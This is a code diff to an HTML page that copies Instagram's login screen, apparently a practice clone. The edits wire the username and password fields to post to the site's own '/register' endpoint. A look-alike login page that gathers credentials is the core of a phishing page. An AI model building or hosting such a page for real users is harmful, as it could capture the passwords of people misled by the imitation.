@@ -5,10 +5,7 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title> Instagram Login Form </title>
-    <link rel="stylesheet" href="./style.css"
-        integrity="sha512-SzlrxWUlpfuzQ+pcUCosxcglQRNAq/DZjVsC0lE40xsADsfeQoEypE+enwcOiGjk/bSuGGKHEyjSoQ1zVisanQ=="
-        crossorigin="anonymous" referrerpolicy="no-referrer" />
-    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="/style.css">
 </head>
 <body>
     <form action="/register" method="post">
@@ -19,19 +16,19 @@
                     <img src="./photos/Screenshot 2023-12-09 114526.png" />
                 </div>
                 <div>
-                    <input type="text" placeholder="username" class="username" />
+                    <input type="text" name="username" placeholder="username" class="username" required />
                     <div>
-                        <input type="password" placeholder="password" class="password" />
+                        <input type="password" name="password" placeholder="password" class="password" required />
                     </div>
-                    <input type="button" value="Log in" class="login-btn" />
+                    <input type="submit" value="Log in" class="login-btn" />
                 </div>
 
                 <span class="or"> OR </span>
 
                 <div class="main-bottom">
                     <img src="./photos/facebook_logo.png" class="fa-facebook-f" />
-                    <a href="www.facebook.com" class="logInFB"> Log in with Facebook </a><br>
-                    <a href="" class="forget"> Forgot password </a>
+                    <a href="https://www.facebook.com" class="logInFB"> Log in with Facebook </a><br>
+                    <a href="#" class="forget"> Forgot password </a>
                 </div>
 
             </div>
@@ -76,6 +73,6 @@
             </div>
         </footer>
     </div>
-</form>
+    </form>
 </body>
 </html>
